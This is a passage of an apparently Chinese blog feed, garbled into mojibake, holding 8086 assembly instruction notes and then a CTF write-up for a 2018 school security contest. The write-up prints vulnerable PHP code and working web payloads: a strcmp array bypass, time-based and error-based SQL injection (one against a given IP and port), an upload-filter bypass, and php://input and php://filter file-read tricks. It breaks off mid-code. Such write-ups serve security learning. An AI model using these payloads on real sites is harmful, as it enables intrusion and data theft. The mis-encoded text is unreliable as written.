æ³•ä¸ºä¾‹ï¼Œå¦‚æœä¸¤æ•°ç¬¦å·ç›¸åŒï¼Œç»“æœå´ç›¸åï¼Œåˆ™of=1ï¼›å¦åˆ™of=0ï¼›ï¼ˆå¦‚æœä¸¤æ•°ç¬¦å·ç›¸åï¼Œæ˜¯ä¸ä¼šæº¢å‡ºçš„ï¼‰ã€‚<br>cfçš„è®¾ç½®ï¼Œæœ€é«˜æœ‰æ•ˆä½ï¼ˆbit7ï¼Œæ¯”å¦‚ï¼‰å‘é«˜ä½è¿›ä½åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚æ‰€ä»¥å®é™…ä¸Šofæ˜¯è¡¨ç¤ºæœ‰ç¬¦å·æ•°çš„æº¢å‡ºï¼Œcfæ˜¯è¡¨ç¤ºæ— ç¬¦å·æ•°çš„æº¢å‡ºã€‚</p><h2 id="jz"><a href="#jz" class="headerlink" title="jz"></a>jz</h2><p>JZï¼ˆJump if Zeroï¼‰æ˜¯æ­¤å‰çš„è¿ç®—ç»“æœä¸º0æ—¶è·³è½¬ã€‚<br>è‹¥æ­¤å‰è¿ç®—ç»“æœä¸ä¸º0ï¼Œåˆ™ä¸è·³è½¬ï¼Œæ‰§è¡ŒJZæŒ‡ä»¤åé¢çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚<br>åˆ¤æ–­ç»“æœæ˜¯å¦ä¸ºé›¶ï¼Œé çš„æ˜¯ZFæ ‡å¿—ä½çŠ¶æ€ã€‚<br>è‹¥ç»“æœæ˜¯0ï¼Œåˆ™ZF=1<br>è‹¥ç»“æœä¸æ˜¯0ï¼Œåˆ™ZF=0<br>æ‰€ä»¥ï¼ŒJZæŒ‡ä»¤æ˜¯åœ¨ZF=1æ—¶è·³è½¬ï¼ŒZF=0æ—¶ä¸è·³è½¬ã€‚</p><h2 id="jzä¸jnzçš„åŒºåˆ«"><a href="#jzä¸jnzçš„åŒºåˆ«" class="headerlink" title="jzä¸jnzçš„åŒºåˆ«"></a>jzä¸jnzçš„åŒºåˆ«</h2><p>jnzç»“æœä¸ä¸ºé›¶ï¼ˆæˆ–ä¸ç›¸ç­‰ï¼‰åˆ™è½¬ç§»ã€‚</p><p>jzå³é›¶æ ‡å¿—ä¸º1å°±è·³è½¬ã€‚</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>æµ‹è¯•(ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ).<br>TEST AX,BX ä¸ AND AX,BX å‘½ä»¤æœ‰ç›¸åŒæ•ˆæœ<br>retæŒ‡ä»¤å’ŒretfæŒ‡ä»¤<br>retæŒ‡ä»¤ç”¨æ ˆä¸­çš„æ•°æ®ï¼Œä¿®æ”¹IPçš„å†…å®¹ï¼Œä»è€Œå®ç°è¿‘è½¬ç§»<br>retfæŒ‡ä»¤ç”¨æ ˆçš„æ•°æ®ï¼Œä¿®æ”¹CSå’ŒIPçš„å†…å®¹ï¼Œä»è€Œå®ç°è¿œè½¬ç§»</p><p>CPUæ‰§è¡ŒretæŒ‡ä»¤æ—¶ï¼Œç›¸å½“äºè¿›è¡Œï¼š</p><p>pop IP</p><p>CPUæ‰§è¡ŒretfæŒ‡ä»¤æ—¶ï¼Œç›¸å½“äºè¿›è¡Œï¼š</p><p>pop IP<br>pop CS</p><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>CALLï¼ˆLCALLï¼‰æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œè¿›è¡Œä¸¤æ­¥æ“ä½œï¼š<br>ï¼ˆ1ï¼‰å°†ç¨‹åºå½“å‰æ‰§è¡Œçš„ä½ç½®IPå‹å…¥å †æ ˆä¸­ï¼› ã€€ã€€ï¼ˆ2ï¼‰è½¬ç§»åˆ°è°ƒç”¨çš„å­ç¨‹åºã€‚<br>JMPå’ŒCALLçš„ä¸€ä¸ªæœ´å®çš„åŒºåˆ«å°±æ˜¯ï¼š<br>JMPè·³èµ°ä¹‹åï¼Œå®ƒå¯ä»¥è·³å›æ¥ï¼Œä¹Ÿå¯ä»¥å†è·³åˆ°åˆ«çš„åœ°æ–¹ä¸å›å»ã€‚<br>CALLè°ƒç”¨å­ç¨‹åºåï¼Œå°±ç®—å†è°ƒç”¨åˆ«çš„å­ç¨‹åºä¹Ÿä¸€å®šä¼šè¿”å›ä¸»ç¨‹åºã€‚<br>JMPå’ŒCALLåœ¨æœ‰äº›æ—¶å€™åº”è¯¥éƒ½å¯ä»¥ç”¨å§â†’ _â†’ </p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>pop ax ï¼Œå°±æ˜¯å°†æ ˆé¡¶çš„é‚£ä¸ªæ•°å–å‡ºå¹¶å­˜å…¥åˆ°axå¯„å­˜å™¨ä¸­<br>push ax  æ˜¯æŠŠaxé‡Œçš„å€¼å‹å…¥å †æ ˆ</p><h2 id="rol"><a href="#rol" class="headerlink" title="rol"></a>rol</h2><p>ROLå’ŒRORæŒ‡ä»¤<br>å¾ªç¯å·¦ç§»/å³ç§»æŒ‡ä»¤åªæ˜¯ç§»ä½æ–¹å‘ä¸åŒï¼Œå®ƒä»¬ç§»å‡ºçš„ä½ä¸ä»…è¦è¿›å…¥CFï¼Œè€Œä¸”è¿˜è¦å¡«è¡¥ç©ºå‡ºçš„ä½ã€‚</p><p>ä¾‹å¦‚:</p><pre><code>MOV AL,82HROL AL,1</code></pre><p>é¦–å…ˆæŠŠ82Hè½¬æ¢æˆäºŒè¿›åˆ¶æ•°10000010B<br>å¾ªç¯å·¦ç§»1ä½åå˜æˆï¼š00000101Bï¼Œæ¢ç®—æˆåå…­è¿›åˆ¶æ•°ä¾¿æ˜¯05H<br>å¾ªç¯å³ç§»1ä½åå˜æˆï¼š01000001Bï¼Œæ¢ç®—æˆåå…­è¿›åˆ¶æ•°ä¾¿æ˜¯41H</p><h2 id="DEC"><a href="#DEC" class="headerlink" title="DEC"></a>DEC</h2><p>DECæ˜¯å‡1æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤ä½¿æ“ä½œæ•°çš„å†…å®¹å‡1ï¼Œç„¶åå†é€å›è¯¥æ“ä½œæ•°ã€‚è¯¥æ“ä½œæ•°å¯ä»¥æ˜¯å¯„å­˜å™¨æ“ä½œæ•°ã€å­˜å‚¨å™¨æ“ä½œæ•°ã€‚<br>ä¾‹å¦‚ï¼š<br>DEC AL;ALå†…å®¹å‡1ï¼Œç„¶åå†é€AL<br>DEC AX;AXå‡å†…å®¹1ï¼Œç„¶åå†é€AX<br>DEC CONT;CONTå‡å†…å®¹1ï¼Œç„¶åå†é€CONT</p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>æ˜¯å­ç¨‹åºå®šä¹‰ä¼ªæŒ‡ä»¤ï¼Œ faræ˜¯è¯¥å­ç¨‹åºçš„å±æ€§ï¼Œå†³å®šè°ƒç”¨ç¨‹åºå’Œå­ç¨‹åºæ˜¯å¦åœ¨åŒä¸€ä»£ç æ®µ<br>å¦‚ä¸‹ï¼šä¸ºå­ç¨‹åºå®šä¹‰åŠè¯´æ˜ï¼Œ</p><pre><code>å­ç¨‹åºå PROC NEAR ( æˆ– FAR )â€¦â€¦retå­ç¨‹åºå ENDPå­ç¨‹åºåä¸ºç¬¦åˆè¯­æ³•çš„æ ‡è¯†ç¬¦</code></pre><p>NEARå±æ€§(æ®µå†…è¿‘è°ƒç”¨): è°ƒç”¨ç¨‹åºå’Œå­ç¨‹åºåœ¨åŒä¸€ä»£ç æ®µä¸­,åªèƒ½è¢«ç›¸åŒä»£ç æ®µçš„å…¶ä»–ç¨‹åºè°ƒç”¨;<br>FARå±æ€§(æ®µé—´è¿œè°ƒç”¨): è°ƒç”¨ç¨‹åºå’Œå­ç¨‹åºä¸åœ¨åŒä¸€ä»£ç æ®µä¸­,å¯ä»¥è¢«ç›¸åŒæˆ–ä¸åŒä»£ç æ®µçš„ç¨‹åºè°ƒç”¨.</p><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><p>LEAæŒ‡ä»¤çš„åŠŸèƒ½æ˜¯å–åç§»åœ°å€ï¼Œä¾‹å¦‚LEA AX,[1000H]ï¼Œä½œç”¨æ˜¯å°†æºæ“ä½œæ•°[1000H]çš„åç§»åœ°å€1000Hé€è‡³AXï¼›<br>MOVæŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ä¼ é€æ•°æ®ï¼Œä¾‹å¦‚MOV AX,[1000H]ï¼Œä½œç”¨æ˜¯å°†1000Hä½œä¸ºåç§»åœ°å€ï¼Œå¯»å€æ‰¾åˆ°å†…å­˜å•å…ƒï¼Œå°†è¯¥å†…å­˜å•å…ƒä¸­çš„æ•°æ®é€è‡³AXï¼›<br>LEAæŒ‡ä»¤çš„åŠŸèƒ½æ˜¯å–åç§»åœ°å€ï¼Œä¾‹å¦‚LEA AX,[1000H]ï¼Œä½œç”¨æ˜¯å°†æºæ“ä½œæ•°[1000H]çš„åç§»åœ°å€1000Hé€è‡³AXã€‚ç†è§£æ—¶ï¼Œå¯ç›´æ¥å°†[ ]å»æ‰ï¼Œç­‰åŒäºMOV AX,1000Hã€‚<br>å†å¦‚ï¼šLEA BX,[AX]ï¼Œç­‰åŒäºMOV BX,AXï¼›LEA BX,TABLE ç­‰åŒäº MOV BX,OFFSET TABLEã€‚<br>ä½†æœ‰æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨MOVä»£æ›¿ï¼š<br>æ¯”å¦‚ï¼š</p><pre><code>LEA AX,[SI+6] ä¸èƒ½ç›´æ¥æ›¿æ¢æˆï¼šMOV AX,SI+6ï¼›ä½†å¯æ›¿æ¢ä¸ºï¼šMOV AX,SIADD AX,6ä¸¤æ­¥å®Œæˆã€‚</code></pre><h2 id="xlat"><a href="#xlat" class="headerlink" title="xlat"></a>xlat</h2><p>æ˜¯ä¸€ç§æŒ‡ä»¤ç¨‹åºã€‚æ“ä½œæ˜¯ä»¥DS:[BX+AL]ä¸ºåœ°å€ï¼Œæå–å­˜å‚¨å™¨ä¸­çš„ä¸€ä¸ªå­—èŠ‚å†é€å…¥ALã€‚<br>ä¾‹ä¸€</p><pre><code>X DW 1122H,3344H,5566H,7788Hã€‚LEA BX,Xã€‚MOV AL,03Hã€‚XLATã€‚</code></pre><p>ç»“æœALä¸º33Hã€‚<br>XLATä½œç”¨:å°†((BX)+(AL))é€ç»™(AL)â€”-ç®€å•:å°†BXä¸ºé¦–åœ°å€çš„,åç§»åœ°å€ä¸ºALçš„å†…å®¹é€ç»™ALã€‚<br>åœ¨è¿è¡ŒXLATä¹‹å‰,AL=3 BX=(Xçš„é¦–åœ°å€)ã€‚<br>è¿™æ—¶BX+ALå°±æ˜¯33â€¦.ä¸ºä»€ä¹ˆ?æ³¨æ„é«˜åœ°å€æ”¾åœ¨ä¸‹é¢ã€‚<br>ä¹Ÿå°±æ˜¯ã€‚<br>22â€”â€”BXæŒ‡å‘è¿™é‡Œã€‚<br>11ã€‚<br>44ã€‚<br>33â€”â€“åç§»åœ°å€ALä¸º3çš„ä½ç½®å°±æ˜¯è¿™é‡Œã€‚<br>XLAT Xã€‚<br>åœ¨æ‰§è¡ŒXLATä¹‹å‰,å…ˆå°†Xçš„åœ°å€é€ç»™BX,åç§»æ¬¡æ•°é€ç»™ALã€‚<br>XLATå³ä¸ºæŸ¥æ‰¾æŒ‡ä»¤ (ä¸€ä¸ªå­—èŠ‚)ã€‚</p><h2 id="shlå’ŒshræŒ‡ä»¤"><a href="#shlå’ŒshræŒ‡ä»¤" class="headerlink" title="shlå’ŒshræŒ‡ä»¤"></a>shlå’ŒshræŒ‡ä»¤</h2><p>shlå’Œshræ˜¯é€»è¾‘ç§»ä½æŒ‡ä»¤ã€‚</p><p>shlæ˜¯é€»è¾‘å·¦ç§»æŒ‡ä»¤ï¼Œå®ƒçš„åŠŸèƒ½ä¸ºï¼š</p><p>ï¼ˆ1ï¼‰å°†ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜å•å…ƒä¸­çš„æ•°æ®å‘å·¦ç§»ä½ï¼›</p><p>ï¼ˆ2ï¼‰å°†æœ€åç§»å‡ºçš„ä¸€ä½å†™å…¥CFä¸­ï¼›</p><p>ï¼ˆ3ï¼‰æœ€ä½ä½ç”¨0è¡¥å……ã€‚</p><p>æŒ‡ä»¤ï¼š<br>mov al,01001000b</p><p>shl al,1 ;å°†alä¸­æ•°æ®å·¦ç§»ä¸€ä½</p><p>æ‰§è¡Œåï¼ˆalï¼‰=10010000bï¼ŒCF=0ã€‚</p><p>æ³¨æ„ï¼š</p><p>å¦‚æœç§»åŠ¨ä½æ•°å¤§äº1æ—¶ï¼Œå¿…é¡»å°†ç§»åŠ¨ä½æ•°æ”¾åœ¨clä¸­ã€‚</p><p>æ¯”å¦‚ï¼ŒæŒ‡ä»¤ï¼š</p><p>mov al,01010001b</p><p>mov cl,3</p><p>shl al,cl</p><p>æ‰§è¡Œåï¼ˆalï¼‰=10001000bï¼Œå› ä¸ºæœ€åç§»å‡ºçš„ä¸€ä½æ˜¯0ï¼Œæ‰€ä»¥CF=0ã€‚</p><p>shræ˜¯é€»è¾‘å³ç§»æŒ‡ä»¤ï¼Œå®ƒå’Œshlæ‰€è¿›è¡Œçš„æ“ä½œåˆšå¥½ç›¸åã€‚</p><h2 id="SP-BP-SI-DIä½œç”¨"><a href="#SP-BP-SI-DIä½œç”¨" class="headerlink" title="SP,BP ,SI,DIä½œç”¨"></a>SP,BP ,SI,DIä½œç”¨</h2><p>sp:è¡¨ç¤ºæ ˆé¡¶æŒ‡é’ˆ,æŒ‡å‘æ ˆé¡¶åœ°å€.ä¸SSç›¸é…åˆä½¿ç”¨.ssä¸ºæ ˆæ®µ.</p><p>bp:æ˜¯åŸºå€æŒ‡é’ˆ,æ®µåœ°å€é»˜è®¤åœ¨SSä¸­.å¯ä»¥å®šä½ç‰©ç†åœ°å€,æ¯”å¦‚:â€mov ax,[bp+si+6]/mov ax,[bp+di+6].</p><p>DI:æ˜¯ç›®çš„å˜å€å¯„å­˜å™¨.ä¸€èˆ¬æƒ…å†µä¸‹ä¸dsè”ç”¨,æ¥ç¡®å®šæŸä¸ªå‚¨å­˜å•å…ƒçš„åœ°å€.</p><p>SI:æ˜¯æºå˜å€å¯„å­˜å™¨,é»˜è®¤æ®µåœ°å€å’ŒDIä¸€æ ·,åœ¨DSä¸­.å’ŒDSè”ç”¨.</p><p>è¿™å››ä¸ªå¯„å­˜å™¨,éƒ½æ˜¯16ä½çš„,ä¸å¯ä»¥åˆ†å‰²ä¸ºå…«ä½.</p><p>è¦æ³¨æ„,1,spå’Œbpæ®µåœ°å€é»˜è®¤åœ¨SSä¸­.2..spæŒ‡å‘æ ˆé¡¶å…ƒç´ åœ°å€.æœ‰è‡ªåŠ å’Œè‡ªå‡èƒ½åŠ›,è€Œbpæ²¡æœ‰.ä½†æ˜¯bpå¯ä»¥å®šä½æ ˆä¸­æŸä¸ªå…ƒç´ çš„ç‰©ç†åœ°å€.</p><p>DIå’ŒSI</p><p>è¿™ä¸¤ä¸ªå±äºå˜å€å¯„å­˜å™¨.å¯ä»¥å’Œbx.bpè”ç”¨,ä½†æ˜¯å’Œbxè¿ç”¨æ—¶,æ®µåœ°å€åœ¨DSä¸­,å’Œbpè”ç”¨æ—¶,æ®µåœ°å€åœ¨SSä¸­.ä¹Ÿå¯ä»¥å•ç‹¬ä½¿ç”¨,å•ç‹¬ä½¿ç”¨æ—¶,æ®µåœ°å€é»˜è®¤åœ¨DSä¸­,æƒ³è¦è¶Šæ®µä½¿ç”¨,åŠ ä¸Šæ®µå‰ç¼€å³å¯.</p><p>åœ¨ä¸²æŒ‡ä»¤æ“ä½œä¸­,siå’Œdsè”ç”¨,ç¡®å®šç›®æ ‡æºåœ°å€,diå’Œes(é™„åŠ æ®µå¯„å­˜å™¨)è”ç”¨,ç¡®å®šä¼ é€çš„ç›®çš„åœ°å€.è¯´ç™½äº†å°±æ˜¯,åˆ†åˆ«å¯»å€æ•°æ®æ®µå’Œé™„åŠ æ®µ.</p><p>åœ¨ä¸²æŒ‡ä»¤ä¸­,siå’Œdiå…·æœ‰è‡ªåŠ å’Œè‡ªå‡åŠŸèƒ½,</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018ä¸­åŸå·¥å­¦é™¢ç½‘ç»œå®‰å…¨æ ¡èµ›</title>
      <link href="/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/"/>
      <url>/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="Dropsæ”»é˜²è®­ç»ƒè¥æ¬¢è¿ä½ çš„åŠ å…¥"><a href="#Dropsæ”»é˜²è®­ç»ƒè¥æ¬¢è¿ä½ çš„åŠ å…¥" class="headerlink" title="Dropsæ”»é˜²è®­ç»ƒè¥æ¬¢è¿ä½ çš„åŠ å…¥"></a>Dropsæ”»é˜²è®­ç»ƒè¥æ¬¢è¿ä½ çš„åŠ å…¥</h2><p>æ‰“å¼€é¡µé¢æŸ¥çœ‹å“åº”å¤´æœ‰ä¸€ä¸ª tips:4he9e.txt ç„¶åè®¿é—®è¿™ä¸ªé¡µé¢</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"***"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>)</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®è¦æ±‚è®©repoä¸flagå­—ç¬¦ä¸²ç›¸ç­‰å°±è¾“å‡ºflag<br>strcmp()å‡½æ•°ä¹Ÿåªèƒ½å¤„ç†å­—ç¬¦ä¸²å‚æ•°ï¼Œä¼ ä¸ªæ•°ç»„è¿›å»å°±èƒ½è¿”å›falseï¼Œåˆç”±äºå®ƒä¸0çš„æ¯”è¾ƒç”¨çš„æ˜¯==  è€Œä¸æ˜¯  ===ï¼ˆå…è®¸ç±»å‹è½¬æ¢åæ¯”è¾ƒï¼‰ï¼Œå°±æ»¡è¶³äº†è¿™ä¸ª if çš„æ¡ä»¶ã€‚Payloadï¼š?repo[]=a</p><h2 id="æƒŠé¸¿ä¸€ç¬”ï¼Œä¸Šå®˜å©‰å„¿"><a href="#æƒŠé¸¿ä¸€ç¬”ï¼Œä¸Šå®˜å©‰å„¿" class="headerlink" title="æƒŠé¸¿ä¸€ç¬”ï¼Œä¸Šå®˜å©‰å„¿"></a>æƒŠé¸¿ä¸€ç¬”ï¼Œä¸Šå®˜å©‰å„¿</h2><p>è¿™é“é¢˜æƒ³äº†å¥½ä¹…,union,and,=,extractvalue,è¢«è¿‡æ»¤<br>è¯•äº†æŠ¥é”™,ä¸è¡Œ,å‘ç°æ˜¯æ•°å­—å‹çš„SQLæ³¨å…¥ï¼Œå°è¯•expæŠ¥é”™ä¹Ÿä¸è¡Œ,å‘ç°è¯•å„ç§æŠ¥é”™éƒ½åŸæ ·è¾“å‡ºæŠ¥é”™,äºæ˜¯å°è¯•æ—¶é—´ç›²æ³¨</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">39.108</span><span class="number">.109</span><span class="number">.85</span>:<span class="number">9001</span>/?id=<span class="number">1</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ<br>è¿™é‡Œè¦å­¦ä¸€ä¸ªå‡½æ•° <strong>linestring</strong><br>linestringæ˜¯Mysqlè‡ªå¸¦çš„ç©ºé—´ç´¢å¼•å‡½æ•°ç”¨æ¥ç´¢å¼•åˆ—åï¼Œè¿˜æœ‰ä¸€ä¸ªå‡½æ•°ä¹Ÿæœ‰è¿™ä¸ªæ•ˆæœ<strong>polygon</strong> è¿™ä¸ªè¯­å¥è¿›è¡ŒæŠ¥é”™<br>åœ¨mysqlçš„securityæ•°æ®åº“usersè¡¨</p><pre><code>select * from users where id=1 and linestring(id);</code></pre><p>ERROR 1367 (22007): Illegal non geometric â€˜<code>security</code>.<code>users</code>.<code>id</code>â€˜ value found during parsing<br>payloadå¦‚ä¸‹:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> exp(~<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> linestring(<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> polygon(<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure><h2 id="å¿«ä¸€ç‚¹"><a href="#å¿«ä¸€ç‚¹" class="headerlink" title="å¿«ä¸€ç‚¹"></a>å¿«ä¸€ç‚¹</h2><p>You need get a â€˜tâ€™<br>äºæ˜¯æ„é€ ä¸€ä¸ª?t=1<br>å¾—åˆ°ä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span></span><br><span class="line"><span class="php">        getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®è¦æ±‚sleepæ˜¯ä¸ªæ•°å­—ï¼Œå¹¶åœ¨2592000å’Œ7776000ä¹‹é—´ï¼Œç„¶åsleepè¿™ä¹ˆé•¿æ—¶é—´ï¼Œç»™å‡ºflagã€‚<br>è¿™é¢˜ä¸»è¦è€ƒå¯Ÿis_numeric()å’Œint()çš„åŒºåˆ«ã€‚å‰è€…æ”¯æŒæ™®é€šæ•°å­—å‹ã€ç§‘å­¦è®°æ•°æ³•å‹ã€éƒ¨åˆ†æ”¯æŒåå…­è¿›åˆ¶0xå‹ï¼Œåœ¨is_numeric()æ”¯æŒçš„å½¢å¼ä¸­ï¼Œint()ä¸èƒ½æ­£ç¡®è½¬æ¢åå…­è¿›åˆ¶å‹ã€ç§‘å­¦è®¡æ•°æ³•å‹ã€‚<br>å› æ­¤å¯ä»¥æ„é€ </p><pre><code>sleep = 6e6ã€0x4F1A01</code></pre><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>ä¸Šä¼ .php,å¼¹å‡º<br>alert(â€˜ä¸å…è®¸çš„æ–‡ä»¶ï¼â€™);history.go(-1)<br>æ”¹ä¸º.jpg<br>alert(â€˜ä¸Šä¼ æˆåŠŸï¼â€™);history.go(-1)<br>ç”¨äºè¿™é“é¢˜æ²¡æœ‰å›æ˜¾ä¸Šä¼ è·¯å¾„<br>è¿™é“é¢˜åº”è¯¥æ˜¯é»‘åå•ç»•è¿‡<br>ç»è¿‡æµ‹è¯•<br>.pht  å¯ä»¥ç»•è¿‡  ,æ³¨æ„è¿˜è¦æ”¹content-type:image/jpeg</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>æ‰“å¼€è®¿é—®<br>you are not admin !<br>æŸ¥çœ‹æºç , å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ ä¸‰ä¸ªå‚æ•°userã€fileã€passä½¿å…¶èƒ½é€šè¿‡<br>æ³¨æ„</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="name">isset</span>($user)<span class="symbol">&amp;&amp;</span>(<span class="name">file_get_contents</span>($user,'r')===<span class="string">"admin"</span>))</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨phpçš„å°è£…åè®®php://input<br>include($file);//class.php<br>è¯»å–class.phpæ–‡ä»¶å’Œindex.phpæ–‡ä»¶</p><pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php</code></pre><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span 